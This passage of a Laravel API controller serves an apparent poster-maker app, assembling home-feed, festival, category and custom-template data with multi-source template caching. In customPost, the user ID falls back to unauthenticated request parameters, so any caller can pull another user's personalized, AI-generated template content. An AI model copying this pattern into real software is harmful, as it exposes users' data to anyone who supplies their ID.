<?php

namespace App\Http\Controllers\Api;

use PDF;
use App\Models\News;
use App\Models\User;
use App\Models\Entry;
use App\Models\Offer;
use App\Models\Story;
use App\Models\Video;
use App\Models\Inquiry;
use App\Models\Product;
use App\Models\Sticker;
use App\Models\Subject;
use App\Models\Business;
use App\Models\Category;
use App\Models\Language;
use App\Models\Festivals;
use App\Models\AdsSetting;
use App\Models\ApiSetting;
use App\Models\AppSetting;
use App\Models\CouponCode;
use App\Models\CustomPost;
use App\Models\CustomFrame;
use App\Models\FeaturePost;
use App\Models\PosterMaker;
use App\Models\Transaction;
use Illuminate\Support\Str;
use App\Models\BusinessCard;
use App\Models\EmailSetting;
use App\Models\OtherSetting;
use App\Models\Subscription;
use Illuminate\Http\Request;
use App\Models\BusinessFrame;
use App\Models\CategoryPost;
use App\Models\PaytmChecksum;
use App\Models\EarningHistory;
use App\Models\FestivalsPost;
use App\Models\PaymentSetting;
use App\Models\PosterCategory;
use App\Models\ReferralSystem;
use App\Models\StorageSetting;
use App\Models\CouponCodeStore;
use App\Models\CustomPostFrame;
use App\Models\ProductCategory;
use App\Models\StickerCategory;
use App\Models\WhatsAppSetting;
use App\Models\WithdrawRequest;
use App\Models\AppUpdateSetting;
use App\Models\BusinessCategory;
use App\Models\ReferralRegister;
use Illuminate\Support\Facades\DB;
use App\Models\BusinessSubCategory;
use App\Models\NotificationSetting;
use App\Http\Controllers\Controller;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\Storage;
use Illuminate\Support\Facades\Validator;
use App\Models\UserNotification;
use App\Models\KnowledgeBase;
use Symfony\Component\HttpFoundation\Response;
use Illuminate\Support\Facades\Cache;

class HomeApi extends Controller
{
    /**
     * Business Profile is consumed by physical phones. Avoid `asset()` here:
     * its cached APP_URL can be localhost even when the request came through
     * the LAN address used by the Flutter app.
     */
    private function businessLogoUrl(?string $path): string
    {
        if (!$path) {
            return '';
        }

        if (filter_var($path, FILTER_VALIDATE_URL)) {
            return $path;
        }

        if (StorageSetting::getStorageSetting('storage') === 'DigitalOcean') {
            return Storage::disk('spaces')->url('uploads/' . ltrim($path, '/'));
        }

        $request = request();
        $basePath = str_replace('/index.php', '', $request->getBaseUrl());
        $origin = rtrim($request->getSchemeAndHttpHost() . $basePath, '/');

        return $origin . '/uploads/' . ltrim($path, '/');
    }

    /**
     * Resolve template JSON from the fastest available source.
     * Priority: 1) Redis Cache 2) DB layers_json/schema_json  3) Disk file
     *
     * @param  string      $zipName  The zip_name identifier (e.g. "Template_abc123")
     * @param  int|null    $frameId  Optional PosterMaker ID for DB lookup
     * @return string|null Raw JSON string, or null if not found
     */
    private function resolveTemplateJson(
        string $zipName,
        ?int $frameId = null,
        ?string $frameType = null
    ): ?string {
        $cleanUuid = preg_replace('/^Template_/i', '', $zipName);
        $cacheKey = "template_json:v2:{$cleanUuid}";
        $cacheTTL = 3600; // 1 hour

        \Log::info("ARTERA_DEBUG resolveTemplateJson CALLED", [
            'zipName' => $zipName,
            'cleanUuid' => $cleanUuid,
            'frameId' => $frameId,
            'frameType' => $frameType,
            'cacheKey' => $cacheKey,
        ]);

        // === SOURCE 1: Redis Cache (fastest — 5ms) ===
        $cached = \Cache::get($cacheKey);
        if ($cached !== null) {
            $parsed = json_decode($cached, true);
            \Log::info("ARTERA_DEBUG resolveTemplateJson SOURCE=CACHE", [
                'zipName' => $zipName,
                'json_length' => strlen($cached),
                'has_layers' => isset($parsed['layers']),
                'layer_count' => isset($parsed['layers']) ? count($parsed['layers']) : 0,
                'render_version' => $parsed['render_version'] ?? 'NOT_SET',
            ]);
            return $cached;
        }

        $jsonData = null;

        // === SOURCE 2: PosterMaker (only if caller explicitly asks for a poster) ===
        if ($frameType === 'poster' && $frameId) {
            $poster = \App\Models\PosterMaker::find($frameId);
            if ($poster && !empty($poster->layers_json)) {
                $jsonData = is_array($poster->layers_json)
                    ? json_encode($poster->layers_json, JSON_UNESCAPED_SLASHES)
                    : $poster->layers_json;
                \Log::info("ARTERA_DEBUG resolveTemplateJson SOURCE=POSTER_DB", [
                    'zipName' => $zipName,
                    'frameId' => $frameId,
                    'json_length' => strlen($jsonData),
                ]);
            } else {
                \Log::info("ARTERA_DEBUG resolveTemplateJson POSTER_DB_MISS", [
                    'zipName' => $zipName,
                    'frameId' => $frameId,
                    'poster_found' => ($poster !== null),
                    'has_layers_json' => $poster ? !empty($poster->layers_json) : false,
                ]);
            }
        }

        // === SOURCE 3: EditorTemplate (by UUID or Template_UUID) ===
        if ($jsonData === null) {
            $editorTemplate = \App\Models\EditorTemplate::where(function ($q) use ($zipName, $cleanUuid) {
                $q->where('uuid', $zipName)
                  ->orWhere('uuid', $cleanUuid);
            })->first();

            if ($editorTemplate && !empty($editorTemplate->legacy_json)) {
                $jsonData = is_array($editorTemplate->legacy_json)
                    ? json_encode($editorTemplate->legacy_json, JSON_UNESCAPED_SLASHES)
                    : $editorTemplate->legacy_json;
                \Log::info("ARTERA_DEBUG resolveTemplateJson SOURCE=EDITOR_TEMPLATE_DB", [
                    'zipName' => $zipName,
                    'json_length' => strlen($jsonData),
                ]);
            } else {
                \Log::info("ARTERA_DEBUG resolveTemplateJson EDITOR_TEMPLATE_MISS", [
                    'zipName' => $zipName,
                    'found' => ($editorTemplate !== null),
                    'has_legacy_json' => $editorTemplate ? !empty($editorTemplate->legacy_json) : false,
                ]);
            }
        }

        // === SOURCE 4: Digital Ocean Fallback ===
        if ($jsonData === null) {
            $storage = \App\Models\StorageSetting::getStorageSetting('storage');
            \Log::info("ARTERA_DEBUG resolveTemplateJson TRYING_DO", ['storage_type' => $storage]);
            if ($storage === 'DigitalOcean') {
                try {
                    $disk = \Illuminate\Support\Facades\Storage::disk('spaces');
                    $base = "uploads/template/{$zipName}/json/";
                    $baseExists = $disk->exists($base);
                    \Log::info("ARTERA_DEBUG resolveTemplateJson DO_BASE_CHECK", [
                        'base' => $base,
                        'exists' => $baseExists,
                    ]);
                    if ($baseExists) {
                        foreach ($disk->files($base) as $file) {
                            if (\Illuminate\Support\Str::endsWith($file, '.json')) {
                                $jsonData = $disk->get($file);
                                \Log::info("ARTERA_DEBUG resolveTemplateJson SOURCE=DIGITAL_OCEAN", [
                                    'zipName' => $zipName,
                                    'file' => $file,
                                    'json_length' => strlen($jsonData),
                                ]);
                                break;
                            }
                        }
                    }
                } catch (\Exception $e) {
                    \Log::error("ARTERA_DEBUG resolveTemplateJson DO_ERROR: " . $e->getMessage());
                }
            }
        }

        // === SOURCE 5: Disk File (slowest local fallback — 100-200ms) ===
        if ($jsonData === null) {
            $jsonDir = public_path('uploads/template/' . $zipName . '/json/');
            $dirExists = is_dir($jsonDir);
            \Log::info("ARTERA_DEBUG resolveTemplateJson TRYING_DISK", [
                'jsonDir' => $jsonDir,
                'dir_exists' => $dirExists,
            ]);
            if ($dirExists) {
                $files = scandir($jsonDir, 1);
                foreach ($files as $f) {
                    if ($f !== '.' && $f !== '..') {
                        $jsonData = file_get_contents($jsonDir . $f);
                        \Log::info("ARTERA_DEBUG resolveTemplateJson SOURCE=DISK", [
                            'zipName' => $zipName,
                            'file' => $f,
                            'json_length' => strlen($jsonData),
                        ]);
                        break;
                    }
                }
            }
        }

        if ($jsonData === null) {
            \Log::warning("ARTERA_DEBUG resolveTemplateJson ALL_SOURCES_FAILED", [
                'zipName' => $zipName,
                'frameId' => $frameId,
                'frameType' => $frameType,
            ]);
            return null;
        }

        // Ensure render_version exists
        $jsonData = $this->ensureRenderVersion($jsonData);

        // Final debug: log what we're about to cache and return
        $finalParsed = json_decode($jsonData, true);
        \Log::info("ARTERA_DEBUG resolveTemplateJson FINAL_RESULT", [
            'zipName' => $zipName,
            'json_length' => strlen($jsonData),
            'has_layers' => isset($finalParsed['layers']),
            'layer_count' => isset($finalParsed['layers']) ? count($finalParsed['layers']) : 0,
            'render_version' => $finalParsed['render_version'] ?? 'NOT_SET',
            'layer_types' => isset($finalParsed['layers']) ? array_map(function($l) {
                return ($l['name'] ?? 'unnamed') . ':' . ($l['type'] ?? 'unknown');
            }, array_slice($finalParsed['layers'], 0, 10)) : [],
        ]);

        // Store in Redis for next request
        \Cache::put($cacheKey, $jsonData, $cacheTTL);

        return $jsonData;
    }

    /**
     * Ensure every JSON payload has a render_version field (default to 1).
     * This prevents the mobile app from receiving JSON without version info.
     */
    private function ensureRenderVersion(string $jsonData): string
    {
        $parsed = json_decode($jsonData, true);
        if ($parsed && !isset($parsed['render_version'])) {
            $parsed['render_version'] = 1;
            return json_encode($parsed, JSON_UNESCAPED_SLASHES);
        }
        return $jsonData;
    }

    /**
     * Build the full CDN/server base URL for template assets (images, skins).
     * Used by the mobile app to construct full image URLs from relative paths.
     *
     * @param  string $zipName The template zip_name
     * @return string Full base URL ending with /
     */
    private function getTemplateBaseUrl(string $zipName): string
    {
        $storage = \App\Models\StorageSetting::getStorageSetting('storage');
        if ($storage === 'DigitalOcean') {
            return \Storage::disk('spaces')->url('uploads/template/' . $zipName) . '/';
        }
        // Local storage
        return str_replace(
            'public/uploads',
            'uploads',
            asset('uploads/template/' . $zipName)
        ) . '/';
    }

    /**
     * Check if client's cached version is still fresh.
     * Returns HTTP 304 (Not Modified) if no update needed.
     *
     * Usage: Call at the start of any API endpoint that returns template data.
     */
    private function checkConditionalRequest(Request $request, string $zipName): ?\Illuminate\Http\Response
    {
        $clientTimestamp = $request->query('last_updated');
        if (!$clientTimestamp) return null;

        // Check if template has been updated since client's version
        $poster = \App\Models\PosterMaker::where('zip_name', $zipName)->first();
        if (!$poster) return null;

        $serverTimestamp = $poster->updated_at?->toIso8601String();

        if ($serverTimestamp && $clientTimestamp === $serverTimestamp) {
            return response('', 304); // Not Modified — client has latest version
        }

        return null; // Modified — send full response
    }

    public function getHomeData()
    {
        $limit = 20;

        $appUpdateSetting = AppUpdateSetting::all();
        $update = [];
        foreach ($appUpdateSetting as $s) 
        {
            $update[$this->from_camel_case($s->key_name)] = $s->key_value;
        }

        // --- Force Update Delay Logic ---
        if (isset($update['appPublishDate']) && isset($update['forceUpdateDelayDays'])) {
            try {
                $publishDate = \Carbon\Carbon::parse($update['appPublishDate']);
                $delayDays = (int) $update['forceUpdateDelayDays'];
                $forceDate = $publishDate->addDays($delayDays);

                if (\Carbon\Carbon::now()->greaterThanOrEqualTo($forceDate)) {
                    $update['cancelOption'] = "0"; // Force update!
                }
            } catch (\Exception $e) {
                // Ignore parsing errors
            }
        }

        // === OPTIMIZATION: Cache storage setting once (was called 20+ times) ===
        $isDigitalOcean = StorageSetting::getStorageSetting('storage') == 'DigitalOcean';

        $story = Story::where('status',1)->orderBy("id","desc")->take(5)->get();
        $category = Category::where('status',1)->orderBy(ApiSetting::getApiSetting("category_order_type"),ApiSetting::getApiSetting("category_order_by"))->get();
        $festival = Festivals::where('status',1)
            ->whereDate('festivals_date', '>=', date('Y-m-d'))
            ->orderBy('festivals_date', 'asc')
            ->take($limit)->get();
        $feature = FeaturePost::orderBy('id', 'desc')->take(5)->get();
        $business_category = BusinessCategory::where('status',1)->orderBy(ApiSetting::getApiSetting("business_order_type"),ApiSetting::getApiSetting("business_order_by"))->take($limit)->get();

        $story_data = [];
        $festival_data = [];
        $feature_data = [];
        $business_category_data = [];
        $category_data = [];
        $profile_business_category_data = [];

        // === OPTIMIZATION: Batch-load all videos for festivals & categories (eliminates N+1) ===
        $festivalIds = $festival->pluck('id')->toArray();
        $categoryIds = $category->pluck('id')->toArray();
        $festivalVideos = Video::where("type","festival")->whereIn("festival_id", $festivalIds)->get()->groupBy('festival_id');
        $categoryVideos = Video::where("type","category")->whereIn("category_id", $categoryIds)->get()->groupBy('category_id');
        
        foreach ($business_category as $cat) {
            $profile_business_category_data[] = array(
                "businessCategoryId" => $cat->id,
                "businessCategoryName" => $cat->name,
                "businessCategoryIcon" => ($cat->icon)?($isDigitalOcean?Storage::disk('spaces')->url('uploads/'.$cat->icon):asset('uploads/'.$cat->icon)):"",
                "video" => false,
            );
        }
        
        foreach ($festival as $f) {
            // Use preloaded videos instead of per-loop query
            $hasVideo = isset($festivalVideos[$f->id]) && $festivalVideos[$f->id]->isNotEmpty();
            $festival_data[] = array(
                "festivalId" => $f->id,
                "festivalTitle" => $f->title,
                "festivalImage" => ($f->image)?($isDigitalOcean?Storage::disk('spaces')->url('uploads/'.$f->image):asset('uploads/'.$f->image)):"",
                "festivalDate" => date_format(date_create(implode("", preg_split("/[-\s:,]/",$f->festivals_date))),"d M, y"),
                "festivalRawDate" => $f->festivals_date,
                "activationDate" => date_format(date_create(implode("", preg_split("/[-\s:,]/",$f->activation_date))),"d M, y"),
                "isActive" => ($f->activation_date <= date("Y-m-d",strtotime('today')))?true:false,
                "video" => $hasVideo,
            );
        }

        $business_category = \App\Models\CustomFramePurpose::where('status',1)->get();

        foreach ($business_category as $cat) {
            $business_category_data[] = array(
                "businessCategoryId" => $cat->id,
                "businessCategoryName" => $cat->name,
                "businessCategoryIcon" => ($cat->icon)?($isDigitalOcean?Storage::disk('spaces')->url('uploads/'.$cat->icon):asset('uploads/'.$cat->icon)):"",
                "video" => false,
            );
        }

        foreach ($category as $cat) {
            // Use preloaded videos instead of per-loop query
            $hasVideo = isset($categoryVideos[$cat->id]) && $categoryVideos[$cat->id]->isNotEmpty();
            $category_data[] = array(
                "categoryId" => $cat->id,
                "categoryName" => $cat->name,
                "categoryIcon" => $isDigitalOcean?Storage::disk('spaces')->url('uploads/'.$cat->icon):asset('uploads/'.$cat->icon),
                "video" => $hasVideo,
            );
        }

        // === OPTIMIZATION: Preload all related data for features with whereIn (eliminates N+1) ===
        $featureFestivalIds = $feature->pluck('festival_id')->filter()->unique()->toArray();
        $featureCategoryIds = $feature->pluck('category_id')->filter()->unique()->toArray();
        $featureCustomIds = $feature->pluck('custom_id')->filter()->unique()->toArray();
        $preloadedFestivals = Festivals::whereIn('id', $featureFestivalIds)->get()->keyBy('id');
        $preloadedCategories = Category::whereIn('id', $featureCategoryIds)->get()->keyBy('id');
        $preloadedCustoms = CustomPost::whereIn('id', $featureCustomIds)->get()->keyBy('id');

        foreach ($feature as $f_data) {
            $festival = $preloadedFestivals->get($f_data->festival_id);
            $category = $preloadedCategories->get($f_data->category_id);
            $custom = $preloadedCustoms->get($f_data->custom_id);
            $f_id = "";
            $f_name = "";
            $f_image = "";
            $video = "";

            if(!empty($festival))
            {
                $hasVideo = isset($festivalVideos[$festival->id]) && $festivalVideos[$festival->id]->isNotEmpty();
                $f_id = $festival->id;
                $f_name = $festival->title;
                $f_image = $festival->image;
                $video = $hasVideo;
            }

            if(!empty($category))
            {
                $hasVideo = isset($categoryVideos[$category->id]) && $categoryVideos[$category->id]->isNotEmpty();
                $f_id = $category->id;
                $f_name = $category->name;
                $f_image = $category->icon;
                $video = $hasVideo;
            }

            if(!empty($custom))
            {
                $video = false;
                $f_id = $custom->id;
                $f_name = $custom->name;
                $f_image = $custom->icon;
            }

            $festival_post = FestivalsPost::where("festivals_id",$f_data->festival_id)->where('status',1)->with(['festivals','language'])->inRandomOrder()->take($limit)->get();
            $category_post = CategoryPost::where("category_id",$f_data->category_id)->where('status',1)->with(['category','language'])->inRandomOrder()->take($limit)->get();
            $custom_frame = CustomPostFrame::where("custom_post_id",$f_data->custom_id)->where('status',1)->inRandomOrder()->take($limit)->get();
            $frame_data = [];

            if(!$festival_post->isEmpty())
            {
                foreach ($festival_post as $f) 
                {
                    $frame_data[] = array(
                        "postId" => $f->festivals->title."".$f->id,
                        "id" => $f->festivals_id,
                        "type" => "festival",
                        "language" => $f->language->title,
                        "image" => ($f->frame_image)?($isDigitalOcean?Storage::disk('spaces')->url('uploads/'.$f->frame_image):asset('uploads/'.$f->frame_image)):"",
                        "is_paid" => ($f->paid==1)?true:false,
                        "height" => $f->height,
                        "width" => $f->width,
                        "image_type" => $f->image_type,
                        "aspect_ratio" => $f->aspect_ratio,
                    );
                }
            }

            if(!$category_post->isEmpty())
            {
                foreach ($category_post as $c) 
                {
                    $frame_data[] = array(
                        "postId" => $c->category->name."".$c->id,
                        "id" => $c->category_id,
                        "type" => "category",
                        "language" => $c->language->title,
                        "image" => ($c->frame_image)?($isDigitalOcean?Storage::disk('spaces')->url('uploads/'.$c->frame_image):asset('uploads/'.$c->frame_image)):"",
                        "is_paid" => ($c->paid==1)?true:false,
                        "height" => $c->height,
                        "width" => $c->width,
                        "image_type" => $c->image_type,
                        "aspect_ratio" => $c->aspect_ratio,
                    );
                }
            }

            if(!$custom_frame->isEmpty())
            {
                foreach ($custom_frame as $cc) 
                {
                    if($cc->zip_name)
                    {
                        // === OPTIMIZATION: Cache template JSON per zip_name ===
                        $json_data = $this->resolveTemplateJson($cc->zip_name, null, 'custom') ?? '';
                    }

                    $frame_data[] = array(
                        "postId" => $cc->custom_post->name."".$cc->id,
                        "id" => $cc->custom_post_id,
                        "type" => "custom ".$cc->custom_frame_type,
                        "is_template" => true,
                        "language" => $cc->language->title,
                        "image" => ($cc->frame_image)?($isDigitalOcean?Storage::disk('spaces')->url('uploads/'.$cc->frame_image):asset('uploads/'.$cc->frame_image)):"",
                        "is_paid" => ($cc->paid==1)?true:false,
                        "height" => $cc->height,
                        "width" => $cc->width,
                        "image_type" => $cc->image_type,
                        "aspect_ratio" => $cc->aspect_ratio,
                        "name" => ($cc->zip_name)?$cc->zip_name:"",
                        "json" => ($cc->zip_name)?$json_data:"",
                        "templateBaseUrl" => ($cc->zip_name)?$this->getTemplateBaseUrl($cc->zip_name):"",
                        "render_version" => $cc->render_version ?? 1,
                        "updated_at" => $cc->updated_at?->toIso8601String() ?? null,
                    );
                }
            }

            $feature_data[] = array(
                "featureId" => $f_data->id,
                "id" => $f_id,
                "title" => $f_name,
                "image" => ($f_image)?($isDigitalOcean?Storage::disk('spaces')->url('uploads/'.$f_image):asset('uploads/'.$f_image)):"",
                "type" => $f_data->type,
                "video" => (!empty($video))?true:false,
                "post" => $frame_data,
            );
        }

        // === OPTIMIZATION: Preload all related data for stories (eliminates 5N queries) ===
        $storyFestivalIds = $story->pluck('festival_id')->filter()->unique()->toArray();
        $storyCategoryIds = $story->pluck('category_id')->filter()->unique()->toArray();
        $storySubIds = $story->pluck('subscription_id')->filter()->unique()->toArray();
        $storyCustomIds = $story->pluck('custom_category_id')->filter()->unique()->toArray();
        $storyFestivals = Festivals::whereIn('id', $storyFestivalIds)->get()->keyBy('id');
        $storyCategories = Category::whereIn('id', $storyCategoryIds)->get()->keyBy('id');
        $storySubscriptions = Subscription::whereIn('id', $storySubIds)->get()->keyBy('id');
        $storyCustoms = CustomPost::whereIn('id', $storyCustomIds)->get()->keyBy('id');

        foreach ($story as $s) {
            $festival = $storyFestivals->get($s->festival_id);
            $category = $storyCategories->get($s->category_id);
            $subscription = $storySubscriptions->get($s->subscription_id);
            $custom = $storyCustoms->get($s->custom_category_id);
            $s_id = "";
            $s_name = "";
            $video = [];

            if(!empty($festival))
            {
                $hasVideo = isset($festivalVideos[$festival->id]) && $festivalVideos[$festival->id]->isNotEmpty();
                $s_id = $festival->id;
                $s_name = $festival->title;
                $video = $hasVideo ? [1] : [];
            }

            if(!empty($custom))
            {
                $s_id = $custom->id;
                $s_name = $custom->name;
            }

            if(!empty($category))
            {
                $hasVideo = isset($categoryVideos[$category->id]) && $categoryVideos[$category->id]->isNotEmpty();
                $s_id = $category->id;
                $s_name = $category->name;
                $video = $hasVideo ? [1] : [];
            }

            if(!empty($subscription))
            {
                $s_id = $subscription->id;
                $s_name = $subscription->plan_name;
            }

            $story_data[] = array(
                "storyId" => $s->id,
                "storyType" => $s->story_type,
                "image" => $isDigitalOcean?Storage::disk('spaces')->url('uploads/'.$s->image):asset('uploads/'.$s->image),
                "id" => $s_id,
                "name" => ($s_name)?$s_name: $s->external_link_title,
                "externalLink"=> $s->external_link,
                "video" => (count($video) == 0)?false:true,
            );
        }
        $otherSetting = \App\Models\OtherSetting::whereIn('key_name', ['privacy_policy', 'terms_condition', 'refund_policy'])->get();
        $privacyPolicyHtml = '';
        $termsConditionHtml = '';
        $refundPolicyHtml = '';

        foreach ($otherSetting as $s) {
            if ($s->key_name == "privacy_policy") {
                $privacyPolicyHtml = $s->key_value;
            } else if ($s->key_name == "terms_condition") {
                $termsConditionHtml = $s->key_value;
            } else if ($s->key_name == "refund_policy") {
                $refundPolicyHtml = $s->key_value;
            }
        }
        
        return response()->json([
            "Story" => $story_data,
            "Festival" => $festival_data,
            "Feature" => $feature_data,
            "BusinessCategory" => $business_category_data,
            "Category" => $category_data,
            "ProfileBusinessCategory" => $profile_business_category_data,
            "privacyPolicyHtml" => $privacyPolicyHtml,
            "termsConditionHtml" => $termsConditionHtml,
            "refundPolicyHtml" => $refundPolicyHtml,
            "appUpdate" => $update,
        ], 200);
    }

    private function injectDynamicBackgroundImageArray($parsedJson, $userId)
    {
        // Background injection using the explicit is_background flag
        \Illuminate\Support\Facades\Log::info("DEBUG API injectBG: Started for user $userId");
        if (!$parsedJson || !isset($parsedJson['layers']) || !$userId) {
            \Illuminate\Support\Facades\Log::info("DEBUG API injectBG: Missing json, layers, or userId. Aborting.");
            return $parsedJson;
        }

        $business = \App\Models\Business::where('user_id', $userId)->where('is_default', 1)->first() ?? \App\Models\Business::where('user_id', $userId)->first();
        if (!$business || !$business->business_category_id) {
            \Illuminate\Support\Facades\Log::info("DEBUG API injectBG: No business or business_category_id found for user $userId. Aborting.");
            return $parsedJson;
        }

        $businessCategoryId = $business->business_category_id;
        \Illuminate\Support\Facades\Log::info("DEBUG API injectBG: Found business category ID: $businessCategoryId for user $userId");
        foreach ($parsedJson['layers'] as $i => &$layer) {
            $isBg = false;
            $isPlaceholder = false;
            if (isset($layer['type']) && $layer['type'] === 'image') {
                if (isset($layer['is_placeholder']) && ($layer['is_placeholder'] == true || $layer['is_placeholder'] == 1)) {
                    $isPlaceholder = true;
                }
                if (isset($layer['is_background']) && $layer['is_background'] == true) {
                    $isBg = true;
                } elseif (isset($layer['name'])) {
                    $name = strtolower($layer['name']);
                    if (str_contains($name, 'background') || $name === 'bg') {
                        $isBg = true;
                    }
                }
            }

            if (($isBg || $isPlaceholder) && isset($layer['w']) && isset($layer['h']) && $layer['h'] > 0) {
                \Illuminate\Support\Facades\Log::info("DEBUG API injectBG: Found BG layer at index $i");
                $ratio = $layer['w'] / $layer['h'];
                $aspectRatioEnum = null;
                
                if (abs($ratio - 1) <= 0.25) {
                    $aspectRatioEnum = '1:1';
                } elseif ($ratio >= 1.25) {
                    $aspectRatioEnum = '16:9';
                } elseif ($ratio <= 0.75) {
                    $aspectRatioEnum = '9:16';
                } else {
                    $aspectRatioEnum = '1:1';
                }
                
                \Illuminate\Support\Facades\Log::info("DEBUG API injectBG: Layer dimensions {$layer['w']}x{$layer['h']}, ratio $ratio, mapped to aspect enum: $aspectRatioEnum");

                if ($aspectRatioEnum) {
                    $randomBg = \App\Models\CategoryBackgroundImage::where('business_category_id', $businessCategoryId)
                                    ->where('aspect_ratio', $aspectRatioEnum)
                                    ->inRandomOrder()
                                    ->first();
                    if ($randomBg) {
                        $layer['src'] = url($randomBg->image);
                        \Illuminate\Support\Facades\Log::info("DEBUG API injectBG: Successfully replaced BG with image ID {$randomBg->id} ({$randomBg->image})");
                    } else {
                        \Illuminate\Support\Facades\Log::info("DEBUG API injectBG: No random background found in DB for category $businessCategoryId and ratio $aspectRatioEnum");
                    }
                }
            }
        }

        return $parsedJson;
    }

    public function customPost()
    {
        $customCategory = \App\Models\CustomFramePurpose::where('status',1)->get();
        $custom_category = [];
        $data = [];
        $isDigitalOcean = StorageSetting::getStorageSetting('storage') == 'DigitalOcean';

        foreach ($customCategory as $c)
        {
            $custom_category[] = array(
                "customCategoryId" => $c->id,
                "customCategoryName" => $c->name,
                "customCategoryIcon" => ($c->icon)?($isDigitalOcean?Storage::disk('spaces')->url('uploads/'.$c->icon):asset('uploads/'.$c->icon)):"",
            );
        }

        foreach ($customCategory as $c)
        {
            $custom_frame = \App\Models\BusinessCustomFrame::where("custom_frame_purpose_id",$c->id)->where("status", 1)->orderBy('id', 'desc')->take(10)->get();
            $posts = [];

            foreach ($custom_frame as $frame) 
            {
                $zip_name = pathinfo($frame->zip_file_path, PATHINFO_FILENAME);
                $json_data = "";

                if($zip_name)
                {
                    $json_data = $this->resolveTemplateJson($zip_name, null, 'custom') ?? '';
                }

                $preview_img = "";
                $templateBaseUrl = "";
                if($isDigitalOcean) {
                    // For DigitalOcean, we assume it's preview.jpg for now, or fallback to similar logic if needed.
                    $preview_img = Storage::disk('spaces')->url('uploads/template/'.$zip_name.'/preview.jpg');
                    $templateBaseUrl = Storage::disk('spaces')->url('uploads/template/'.$zip_name);
                } else {
                    $dir = public_path('uploads/template/'.$zip_name.'/');
                    $templateBaseUrl = asset('uploads/template/'.$zip_name);
                    $templateBaseUrl = str_replace('public/uploads', 'uploads', $templateBaseUrl);
                    if (is_dir($dir)) {
                        if (file_exists($dir.'preview.jpg')) {
                            $preview_img = asset('uploads/template/'.$zip_name.'/preview.jpg');
                            $preview_img = str_replace('public/uploads', 'uploads', $preview_img);
                        } elseif (file_exists($dir.'preview.png')) {
                            $preview_img = asset('uploads/template/'.$zip_name.'/preview.png');
                            $preview_img = str_replace('public/uploads', 'uploads', $preview_img);
                        } elseif (file_exists($dir.'preview.webp')) {
                            $preview_img = asset('uploads/template/'.$zip_name.'/preview.webp');
                            $preview_img = str_replace('public/uploads', 'uploads', $preview_img);
                        } else {
                            $files = glob($dir . '*.{jpg,jpeg,png,webp}', GLOB_BRACE);
                            if (!empty($files)) {
                                $preview_img = asset('uploads/template/'.$zip_name.'/'.basename($files[0]));
                                $preview_img = str_replace('public/uploads', 'uploads', $preview_img);
                            }
                        }
                    }
                }

                $sanctumId = null;
                try { $sanctumId = auth('sanctum')->id(); } catch (\Exception $e) {}
                $userId = $sanctumId ?? request('userId') ?? request('user_id');
                
                if ($userId && !empty($json_data)) {
                    $parsedJson = json_decode($json_data, true);
                    $jsonModified = false;
                    
                    if ($parsedJson) {
                        $newJson = $this->injectDynamicBackgroundImageArray($parsedJson, $userId);
                        if ($newJson !== $parsedJson) {
                            $parsedJson = $newJson;
                            $jsonModified = true;
                        }
                        
                        $aiContent = \App\Models\UserCustomFrameContent::where('user_id', $userId)
                            ->where('business_custom_frame_id', $frame->id)
                            ->first();
                            
                        if ($aiContent && !empty($aiContent->generated_content) && isset($parsedJson['layers'])) {
                            \Illuminate\Support\Facades\Log::info("DEBUG API customPost: AI Content Found for Frame ID: " . $frame->id);
                            $replacedCount = 0;
                            foreach ($parsedJson['layers'] as &$layer) {
                                if (isset($layer['type']) && $layer['type'] === 'text' && isset($layer['name'])) {
                                    if (isset($aiContent->generated_content[$layer['name']])) {
                                        $layer['text'] = $aiContent->generated_content[$layer['name']];
                                        $replacedCount++;
                                        $jsonModified = true;
                                    }
                                }
                            }
                            \Illuminate\Support\Facades\Log::info("DEBUG API customPost: Replaced $replacedCount text layers.");
                        }
                        
                        if ($jsonModified) {
                            $json_data = json_encode($parsedJson);
                        }
                    }
                }

                $posts[] = array(
                    "postId" => $c->name."".$frame->id,
                    "id" => $frame->id,
                    "type" => "business_custom_frame",
                    "is_template" => true,
                    "language" => "All",
                    "image" => $preview_img,
                    "templateBaseUrl" => $templateBaseUrl,
                    "is_paid" => false,
                    "height" => $frame->height ?? 1080,
                    "width" => $frame->width ?? 1080,
                    "image_type" => $frame->imageType->name ?? "square",
                    "aspect_ratio" => $frame->aspect_ratio ?? "1:1",
                    "name" => ($zip_name)?$zip_name:"",
                    "json" => ($zip_name)?$json_data:"",
                    "render_version" => $frame->render_version ?? 1,
                    "updated_at" => $frame->updated_at?->toIso8601String() ?? null,
                    "tags" => $frame->tags ?? [],
                    "created_at" => $frame->created_at ? $frame->created_at->toISOString() : null,
                );
            }

                $allTags = \App\Models\BusinessCustomFrame::where('custom_frame_purpose_id', $c->id)
                    ->where('status', 1)
                    ->pluck('tags')
                    ->flatten()
                    ->filter()
                    ->unique()
                    ->values()
                    ->toArray();

                $data[] = array(
                    "customCategoryId" => $c->id,
                    "customCategoryName" => $c->name,
                    "customCategoryIcon" => ($c->icon)?($isDigitalOcean?Storage::disk('spaces')->url('uploads/'.$c->icon):asset('uploads/'.$c->icon)):"",
                    "tags" => $allTags,
                    "posts" => $posts
                );
            }

            // Build recent posts list (top 10 most recently added templates)
            $allPosts = collect($data)->pluck('posts')->flatten(1)
                ->sortByDesc('created_at')->take(10)->values()->all();

            \Illuminate\Support\Facades\Log::info("CustomPost API Debug: ", [
                'categories_count' => count($custom_category),
                'data_count' => count($data),
                'recent_count' => count($allPosts),
            ]);

            return response()->json([
                "category" => $custom_category,
                "data" => $data,
                "recent_posts" => $allPosts,
            ], 200);
    }

    public function customPostPaginated(Request $request)
    {
        $categoryId = $request->get('category_id');
        $limit = $request->get('limit', 20);
        $page = $request->get('page', 1);

        $tag = $request->get('tag');

        $query = \App\Models\BusinessCustomFrame::where("custom_frame_purpose_id", $categoryId)
            ->where("status", 1);
            
        if (!empty($tag)) {
            $query->whereJsonContains('tags', $tag);
        }

        $custom_frame_paginator = $query->orderBy('id', 'desc')->paginate($limit);
            
        \Illuminate\Support\Facades\Log::info("DEBUG API customPostPaginated: Hit for category $categoryId, page $page. Found {$custom_frame_paginator->count()} frames.");

        $posts = [];
        $isDigitalOcean = StorageSetting::getStorageSetting('storage') == 'DigitalOcean';
        $c = \App\Models\CustomFramePurpose::find($categoryId);

        foreach ($custom_frame_paginator as $frame) 
        {
            $zip_name = pathinfo($frame->zip_file_path, PATHINFO_FILENAME);
            $json_data = "";

            if($zip_name)
            {
                $json_data = $this->resolveTemplateJson($zip_name, null, 'custom') ?? '';
            }

            $preview_img = "";
            if($isDigitalOcean) {
